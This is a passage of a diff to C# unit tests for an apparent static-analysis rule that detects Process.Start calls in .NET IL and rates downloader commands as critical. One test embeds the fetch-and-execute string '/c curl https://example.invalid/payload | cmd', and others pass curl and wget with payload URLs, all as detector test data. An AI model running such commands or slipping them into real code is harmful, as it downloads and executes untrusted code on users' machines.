@@ -222,13 +222,30 @@ public class ProcessStartRuleTests
         var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
         var processor = method.Body.GetILProcessor();
 
+        var processStartInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
+        var constructor = new MethodReference(".ctor", new TypeReference("System", "Void", null, null), processStartInfo)
+            { HasThis = true };
+        var setFileName = new MethodReference("set_FileName", new TypeReference("System", "Void", null, null), processStartInfo)
+            { HasThis = true };
+        setFileName.Parameters.Add(new ParameterDefinition(new TypeReference("", "String", null, null)));
+        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null),
+            new TypeReference("System.Diagnostics", "Process", null, null)) { HasThis = false };
+        methodRef.Parameters.Add(new ParameterDefinition(processStartInfo));
+
+        processor.Emit(OpCodes.Newobj, constructor);
+        processor.Emit(OpCodes.Dup);
         processor.Emit(OpCodes.Ldstr, "yt-dlp.exe");
-        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
-        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));
+        processor.Emit(OpCodes.Callvirt, setFileName);
+        processor.Emit(OpCodes.Call, methodRef);
 
         var instructions = method.Body.Instructions;
         int callIndex = instructions.Count - 1;
-        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));
+
+        InstructionValueResolver.TryResolveCallArgumentIdentity(methodRef, instructions, callIndex, 0,
+            out var launchedIdentity).Should().BeTrue();
+        InstructionValueResolver.TryResolveCallReceiverIdentity(instructions, callIndex - 1,
+            out var setterIdentity).Should().BeTrue();
+        launchedIdentity.Should().Be(setterIdentity);
 
         string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);
 
@@ -239,15 +256,27 @@ public class ProcessStartRuleTests
     public void GetFindingDescription_WithDynamicStartInfoFileName_IncludesDynamicMarker()
     {
         var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
+        method.Body.Variables.Add(new VariableDefinition(new TypeReference("", "String", null, null)));
         var processor = method.Body.GetILProcessor();
 
+        var processStartInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
+        var constructor = new MethodReference(".ctor", new TypeReference("System", "Void", null, null), processStartInfo)
+            { HasThis = true };
+        var setFileName = new MethodReference("set_FileName", new TypeReference("System", "Void", null, null), processStartInfo)
+            { HasThis = true };
+        setFileName.Parameters.Add(new ParameterDefinition(new TypeReference("", "String", null, null)));
+        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null),
+            new TypeReference("System.Diagnostics", "Process", null, null)) { HasThis = false };
+        methodRef.Parameters.Add(new ParameterDefinition(processStartInfo));
+
+        processor.Emit(OpCodes.Newobj, constructor);
+        processor.Emit(OpCodes.Dup);
         processor.Emit(OpCodes.Ldloc_0);
-        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
-        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));
+        processor.Emit(OpCodes.Callvirt, setFileName);
+        processor.Emit(OpCodes.Call, methodRef);
 
         var instructions = method.Body.Instructions;
         int callIndex = instructions.Count - 1;
-        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));
 
         string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);
 
@@ -260,6 +289,18 @@ public class ProcessStartRuleTests
         var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
         var processor = method.Body.GetILProcessor();
 
+        var processStartInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
+        var constructor = new MethodReference(".ctor", new TypeReference("System", "Void", null, null), processStartInfo)
+            { HasThis = true };
+        var setFileName = new MethodReference("set_FileName", new TypeReference("System", "Void", null, null), processStartInfo)
+            { HasThis = true };
+        setFileName.Parameters.Add(new ParameterDefinition(new TypeReference("", "String", null, null)));
+        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null),
+            new TypeReference("System.Diagnostics", "Process", null, null)) { HasThis = false };
+        methodRef.Parameters.Add(new ParameterDefinition(processStartInfo));
+
+        processor.Emit(OpCodes.Newobj, constructor);
+        processor.Emit(OpCodes.Dup);
         processor.Emit(OpCodes.Ldstr, "C:\\Tools");
         processor.Emit(OpCodes.Ldstr, "yt-dlp.exe");
         processor.Emit(OpCodes.Call, new MethodReference("Combine", new TypeReference("", "String", null, null), new TypeReference("System.IO", "Path", null, null))
@@ -270,12 +311,11 @@ public class ProcessStartRuleTests
                 new ParameterDefinition(new TypeReference("", "String", null, null))
             }
         });
-        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
-        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));
+        processor.Emit(OpCodes.Callvirt, setFileName);
+        processor.Emit(OpCodes.Call, methodRef);
 
         var instructions = method.Body.Instructions;
         int callIndex = instructions.Count - 1;
-        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));
 
         string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);
 
@@ -293,15 +333,26 @@ public class ProcessStartRuleTests
         type.Methods.Add(method);
         var processor = method.Body.GetILProcessor();
 
+        var processStartInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
+        var constructor = new MethodReference(".ctor", new TypeReference("System", "Void", null, null), processStartInfo)
+            { HasThis = true };
+        var setFileName = new MethodReference("set_FileName", new TypeReference("System", "Void", null, null), processStartInfo)
+            { HasThis = true };
+        setFileName.Parameters.Add(new ParameterDefinition(new TypeReference("", "String", null, null)));
+        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null),
+            new TypeReference("System.Diagnostics", "Process", null, null)) { HasThis = false };
+        methodRef.Parameters.Add(new ParameterDefinition(processStartInfo));
+
         processor.Emit(OpCodes.Ldstr, "yt-dlp.exe");
         processor.Emit(OpCodes.Stsfld, field);
+        processor.Emit(OpCodes.Newobj, constructor);
+        processor.Emit(OpCodes.Dup);
         processor.Emit(OpCodes.Ldsfld, field);
-        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
-        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));
+        processor.Emit(OpCodes.Callvirt, setFileName);
+        processor.Emit(OpCodes.Call, methodRef);
 
         var instructions = method.Body.Instructions;
         int callIndex = instructions.Count - 1;
-        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));
 
         string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);
 
@@ -350,6 +401,8 @@ public class ProcessStartRuleTests
         var instructions = method.Body.Instructions;
         int callIndex = instructions.Count - 1;
         var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));
+        methodRef.Parameters.Add(new ParameterDefinition(
+            new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
 
         string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);
 
@@ -377,21 +430,573 @@ public class ProcessStartRuleTests
         var processStartInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", module,
             module.TypeSystem.CoreLibrary);
         var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var constructor = new MethodReference(".ctor", module.TypeSystem.Void, processStartInfo) { HasThis = true };
+        var setFileName = new MethodReference("set_FileName", module.TypeSystem.Void, processStartInfo)
+            { HasThis = true };
+        setFileName.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var setUseShellExecute = new MethodReference("set_UseShellExecute", module.TypeSystem.Void,
+            processStartInfo) { HasThis = true };
+        setUseShellExecute.Parameters.Add(new ParameterDefinition(module.TypeSystem.Boolean));
 
         var processor = method.Body.GetILProcessor();
+        processor.Emit(OpCodes.Newobj, constructor);
+        processor.Emit(OpCodes.Dup);
         processor.Emit(OpCodes.Ldstr, "cmd.exe");
-        processor.Emit(OpCodes.Callvirt,
-            new MethodReference("set_FileName", module.TypeSystem.Void, processStartInfo));
+        processor.Emit(OpCodes.Callvirt, setFileName);
+        processor.Emit(OpCodes.Dup);
         processor.Emit(OpCodes.Call, getFlag);
-        processor.Emit(OpCodes.Callvirt,
-            new MethodReference("set_UseShellExecute", module.TypeSystem.Void, processStartInfo));
-        var start = new MethodReference("Start", module.TypeSystem.Boolean, process);
+        processor.Emit(OpCodes.Callvirt, setUseShellExecute);
+        var start = new MethodReference("Start", module.TypeSystem.Boolean, process) { HasThis = false };
+        start.Parameters.Add(new ParameterDefinition(processStartInfo));
+        processor.Emit(OpCodes.Call, start);
+
+        string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain("Target: \"cmd.exe\"");
+    }
+
+    [Fact]
+    public void GetFindingDescription_DirectDownloaderOverload_ResolvesUrlArgumentsAsCritical()
+    {
+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var start = new MethodReference("Start", process, process) { HasThis = false };
+        start.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        start.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+
+        var processor = method.Body.GetILProcessor();
+        processor.Emit(OpCodes.Ldstr, "curl.exe");
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/package.bin");
+        processor.Emit(OpCodes.Call, start);
+
+        string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain("Arguments: https://example.invalid/package.bin");
+        description.Should().Contain("Downloader executable with URL arguments");
+        _rule.Severity.Should().Be(Severity.Critical);
+    }
+
+    [Fact]
+    public void GetFindingDescription_StartInfoConstructor_ResolvesUrlArgumentsAsCritical()
+    {
+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var startInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", module,
+            module.TypeSystem.CoreLibrary);
+        var constructor = new MethodReference(".ctor", module.TypeSystem.Void, startInfo) { HasThis = true };
+        constructor.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        constructor.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var start = new MethodReference("Start", process, process) { HasThis = false };
+        start.Parameters.Add(new ParameterDefinition(startInfo));
+
+        var processor = method.Body.GetILProcessor();
+        processor.Emit(OpCodes.Ldstr, "wget.exe");
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/package.bin");
+        processor.Emit(OpCodes.Newobj, constructor);
+        processor.Emit(OpCodes.Call, start);
+
+        string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain("Arguments: https://example.invalid/package.bin");
+        description.Should().Contain("Downloader executable with URL arguments");
+        _rule.Severity.Should().Be(Severity.Critical);
+    }
+
+    [Fact]
+    public void GetFindingDescription_ProcessInstanceStart_ResolvesAssignedStartInfoCommand()
+    {
+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var startInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", module,
+            module.TypeSystem.CoreLibrary);
+        var processConstructor = new MethodReference(".ctor", module.TypeSystem.Void, process) { HasThis = true };
+        var startInfoConstructor = new MethodReference(".ctor", module.TypeSystem.Void, startInfo) { HasThis = true };
+        var setFileName = new MethodReference("set_FileName", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setFileName.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var setArguments = new MethodReference("set_Arguments", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setArguments.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var setStartInfo = new MethodReference("set_StartInfo", module.TypeSystem.Void, process) { HasThis = true };
+        setStartInfo.Parameters.Add(new ParameterDefinition(startInfo));
+        var start = new MethodReference("Start", module.TypeSystem.Boolean, process) { HasThis = true };
+        var processLocal = new VariableDefinition(process);
+        var startInfoLocal = new VariableDefinition(startInfo);
+        method.Body.Variables.Add(processLocal);
+        method.Body.Variables.Add(startInfoLocal);
+
+        var processor = method.Body.GetILProcessor();
+        processor.Emit(OpCodes.Newobj, processConstructor);
+        processor.Emit(OpCodes.Stloc, processLocal);
+        processor.Emit(OpCodes.Newobj, startInfoConstructor);
+        processor.Emit(OpCodes.Dup);
+        processor.Emit(OpCodes.Ldstr, "cmd.exe");
+        processor.Emit(OpCodes.Callvirt, setFileName);
+        processor.Emit(OpCodes.Dup);
+        processor.Emit(OpCodes.Ldstr,
+            "/c curl https://example.invalid/payload | cmd");
+        processor.Emit(OpCodes.Callvirt, setArguments);
+        processor.Emit(OpCodes.Stloc, startInfoLocal);
+        processor.Emit(OpCodes.Ldloc, processLocal);
+        processor.Emit(OpCodes.Ldloc, startInfoLocal);
+        processor.Emit(OpCodes.Callvirt, setStartInfo);
+        processor.Emit(OpCodes.Ldloc, processLocal);
         processor.Emit(OpCodes.Callvirt, start);
 
         string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
             method.Body.Instructions.Count - 1);
 
         description.Should().Contain("Target: \"cmd.exe\"");
+        description.Should().Contain("Arguments: /c curl https://example.invalid/payload | cmd");
+        description.Should().Contain("suspicious arguments");
+        _rule.Severity.Should().Be(Severity.Critical);
+    }
+
+    [Fact]
+    public void GetFindingDescription_ProcessInstanceStart_ResolvesEquivalentBranchedArguments()
+    {
+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var startInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", module,
+            module.TypeSystem.CoreLibrary);
+        var processConstructor = new MethodReference(".ctor", module.TypeSystem.Void, process) { HasThis = true };
+        var startInfoConstructor = new MethodReference(".ctor", module.TypeSystem.Void, startInfo) { HasThis = true };
+        var setFileName = new MethodReference("set_FileName", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setFileName.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var setArguments = new MethodReference("set_Arguments", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setArguments.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var setStartInfo = new MethodReference("set_StartInfo", module.TypeSystem.Void, process) { HasThis = true };
+        setStartInfo.Parameters.Add(new ParameterDefinition(startInfo));
+        var start = new MethodReference("Start", module.TypeSystem.Boolean, process) { HasThis = true };
+        var processLocal = new VariableDefinition(process);
+        var startInfoLocal = new VariableDefinition(startInfo);
+        method.Body.Variables.Add(processLocal);
+        method.Body.Variables.Add(startInfoLocal);
+
+        var processor = method.Body.GetILProcessor();
+        var elseBranch = Instruction.Create(OpCodes.Ldloc, startInfoLocal);
+        var launch = Instruction.Create(OpCodes.Ldloc, processLocal);
+        processor.Emit(OpCodes.Newobj, processConstructor);
+        processor.Emit(OpCodes.Stloc, processLocal);
+        processor.Emit(OpCodes.Newobj, startInfoConstructor);
+        processor.Emit(OpCodes.Dup);
+        processor.Emit(OpCodes.Ldstr, "curl.exe");
+        processor.Emit(OpCodes.Callvirt, setFileName);
+        processor.Emit(OpCodes.Stloc, startInfoLocal);
+        processor.Emit(OpCodes.Ldloc, processLocal);
+        processor.Emit(OpCodes.Ldloc, startInfoLocal);
+        processor.Emit(OpCodes.Callvirt, setStartInfo);
+        processor.Emit(OpCodes.Ldc_I4_0);
+        processor.Emit(OpCodes.Brfalse, elseBranch);
+        processor.Emit(OpCodes.Ldloc, startInfoLocal);
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/payload");
+        processor.Emit(OpCodes.Callvirt, setArguments);
+        processor.Emit(OpCodes.Br, launch);
+        processor.Append(elseBranch);
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/payload");
+        processor.Emit(OpCodes.Callvirt, setArguments);
+        processor.Append(launch);
+        processor.Emit(OpCodes.Callvirt, start);
+
+        string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain("Target: \"curl.exe\"");
+        description.Should().Contain("Arguments: https://example.invalid/payload");
+        description.Should().Contain("Downloader executable with URL arguments");
+        _rule.Severity.Should().Be(Severity.Critical);
+    }
+
+    [Fact]
+    public void GetFindingDescription_StaticStartInfoOverload_ResolvesEquivalentBranchedArguments()
+    {
+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var startInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", module,
+            module.TypeSystem.CoreLibrary);
+        var constructor = new MethodReference(".ctor", module.TypeSystem.Void, startInfo) { HasThis = true };
+        var setFileName = new MethodReference("set_FileName", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setFileName.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var setArguments = new MethodReference("set_Arguments", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setArguments.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var start = new MethodReference("Start", process, process) { HasThis = false };
+        start.Parameters.Add(new ParameterDefinition(startInfo));
+        var startInfoLocal = new VariableDefinition(startInfo);
+        method.Body.Variables.Add(startInfoLocal);
+
+        var processor = method.Body.GetILProcessor();
+        var elseBranch = Instruction.Create(OpCodes.Ldloc, startInfoLocal);
+        var launch = Instruction.Create(OpCodes.Ldloc, startInfoLocal);
+        processor.Emit(OpCodes.Newobj, constructor);
+        processor.Emit(OpCodes.Dup);
+        processor.Emit(OpCodes.Ldstr, "wget.exe");
+        processor.Emit(OpCodes.Callvirt, setFileName);
+        processor.Emit(OpCodes.Stloc, startInfoLocal);
+        processor.Emit(OpCodes.Ldc_I4_0);
+        processor.Emit(OpCodes.Brfalse, elseBranch);
+        processor.Emit(OpCodes.Ldloc, startInfoLocal);
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/payload");
+        processor.Emit(OpCodes.Callvirt, setArguments);
+        processor.Emit(OpCodes.Br, launch);
+        processor.Append(elseBranch);
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/payload");
+        processor.Emit(OpCodes.Callvirt, setArguments);
+        processor.Append(launch);
+        processor.Emit(OpCodes.Call, start);
+
+        string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain("Target: \"wget.exe\"");
+        description.Should().Contain("Arguments: https://example.invalid/payload");
+        description.Should().Contain("Downloader executable with URL arguments");
+        _rule.Severity.Should().Be(Severity.Critical);
+    }
+
+    [Fact]
+    public void GetFindingDescription_StaticStartInfoOverload_PreservesConditionalArgumentOverride()
+    {
+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var startInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", module,
+            module.TypeSystem.CoreLibrary);
+        var constructor = new MethodReference(".ctor", module.TypeSystem.Void, startInfo) { HasThis = true };
+        var setFileName = new MethodReference("set_FileName", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setFileName.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var setArguments = new MethodReference("set_Arguments", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setArguments.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var start = new MethodReference("Start", process, process) { HasThis = false };
+        start.Parameters.Add(new ParameterDefinition(startInfo));
+        var startInfoLocal = new VariableDefinition(startInfo);
+        method.Body.Variables.Add(startInfoLocal);
+
+        var processor = method.Body.GetILProcessor();
+        var launch = Instruction.Create(OpCodes.Ldloc, startInfoLocal);
+        processor.Emit(OpCodes.Newobj, constructor);
+        processor.Emit(OpCodes.Dup);
+        processor.Emit(OpCodes.Ldstr, "curl.exe");
+        processor.Emit(OpCodes.Callvirt, setFileName);
+        processor.Emit(OpCodes.Dup);
+        processor.Emit(OpCodes.Ldstr, "--version");
+        processor.Emit(OpCodes.Callvirt, setArguments);
+        processor.Emit(OpCodes.Stloc, startInfoLocal);
+        processor.Emit(OpCodes.Ldc_I4_0);
+        processor.Emit(OpCodes.Brfalse, launch);
+        processor.Emit(OpCodes.Ldloc, startInfoLocal);
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/payload");
+        processor.Emit(OpCodes.Callvirt, setArguments);
+        processor.Append(launch);
+        processor.Emit(OpCodes.Call, start);
+
+        string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain("Target: \"curl.exe\"");
+        description.Should().Contain("--version");
+        description.Should().Contain("https://example.invalid/payload");
+        description.Should().Contain("Downloader executable with URL arguments");
+        _rule.Severity.Should().Be(Severity.Critical);
+    }
+
+    [Fact]
+    public void GetFindingDescription_UnrelatedStartInfoConstructor_DoesNotSupplyArguments()
+    {
+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var startInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", module,
+            module.TypeSystem.CoreLibrary);
+        var unrelatedConstructor = new MethodReference(".ctor", module.TypeSystem.Void, startInfo) { HasThis = true };
+        unrelatedConstructor.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        unrelatedConstructor.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var actualConstructor = new MethodReference(".ctor", module.TypeSystem.Void, startInfo) { HasThis = true };
+        var setFileName = new MethodReference("set_FileName", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setFileName.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var start = new MethodReference("Start", process, process) { HasThis = false };
+        start.Parameters.Add(new ParameterDefinition(startInfo));
+        var actualStartInfo = new VariableDefinition(startInfo);
+        method.Body.Variables.Add(actualStartInfo);
+
+        var processor = method.Body.GetILProcessor();
+        processor.Emit(OpCodes.Ldstr, "unrelated.exe");
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/unrelated.bin");
+        processor.Emit(OpCodes.Newobj, unrelatedConstructor);
+        processor.Emit(OpCodes.Pop);
+        processor.Emit(OpCodes.Newobj, actualConstructor);
+        processor.Emit(OpCodes.Stloc, actualStartInfo);
+        processor.Emit(OpCodes.Ldloc, actualStartInfo);
+        processor.Emit(OpCodes.Ldstr, "curl.exe");
+        processor.Emit(OpCodes.Callvirt, setFileName);
+        processor.Emit(OpCodes.Ldloc, actualStartInfo);
+        processor.Emit(OpCodes.Call, start);
+
+        string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain("Target: \"curl.exe\"");
+        description.Should().Contain("Arguments: <unknown/no-arguments>");
+        description.Should().NotContain("Downloader executable with URL arguments");
+        _rule.Severity.Should().Be(Severity.Medium);
+    }
+
+    [Fact]
+    public void GetFindingDescription_DirectOverload_IgnoresUnrelatedStartInfoArgumentsSetter()
+    {
+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var startInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", module,
+            module.TypeSystem.CoreLibrary);
+        var constructor = new MethodReference(".ctor", module.TypeSystem.Void, startInfo) { HasThis = true };
+        var setArguments = new MethodReference("set_Arguments", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setArguments.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var directStart = new MethodReference("Start", process, process) { HasThis = false };
+        directStart.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        directStart.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+
+        var processor = method.Body.GetILProcessor();
+        processor.Emit(OpCodes.Newobj, constructor);
+        processor.Emit(OpCodes.Dup);
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/unrelated.bin");
+        processor.Emit(OpCodes.Callvirt, setArguments);
+        processor.Emit(OpCodes.Pop);
+        processor.Emit(OpCodes.Ldstr, "curl.exe");
+        processor.Emit(OpCodes.Ldstr, "--version");
+        processor.Emit(OpCodes.Call, directStart);
+
+        string description = _rule.GetFindingDescription(method, directStart, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain("Arguments: --version");
+        description.Should().NotContain("Downloader executable with URL arguments");
+        _rule.Severity.Should().Be(Severity.Medium);
+    }
+
+    [Fact]
+    public void GetFindingDescription_StartInfoConstructor_IgnoresUnrelatedArgumentsSetter()
+    {
+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var startInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", module,
+            module.TypeSystem.CoreLibrary);
+        var emptyConstructor = new MethodReference(".ctor", module.TypeSystem.Void, startInfo) { HasThis = true };
+        var configuredConstructor = new MethodReference(".ctor", module.TypeSystem.Void, startInfo) { HasThis = true };
+        configuredConstructor.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        configuredConstructor.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var setArguments = new MethodReference("set_Arguments", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setArguments.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var start = new MethodReference("Start", process, process) { HasThis = false };
+        start.Parameters.Add(new ParameterDefinition(startInfo));
+
+        var processor = method.Body.GetILProcessor();
+        processor.Emit(OpCodes.Newobj, emptyConstructor);
+        processor.Emit(OpCodes.Dup);
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/unrelated.bin");
+        processor.Emit(OpCodes.Callvirt, setArguments);
+        processor.Emit(OpCodes.Pop);
+        processor.Emit(OpCodes.Ldstr, "curl.exe");
+        processor.Emit(OpCodes.Ldstr, "--version");
+        processor.Emit(OpCodes.Newobj, configuredConstructor);
+        processor.Emit(OpCodes.Call, start);
+
+        string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain("Target: \"curl.exe\"");
+        description.Should().Contain("Arguments: --version");
+        description.Should().NotContain("Downloader executable with URL arguments");
+        _rule.Severity.Should().Be(Severity.Medium);
+    }
+
+    [Theory]
+    [InlineData("curl")]
+    [InlineData("wget")]
+    public void GetFindingDescription_BareDownloaderTargetWithUrl_IsCritical(string executable)
+    {
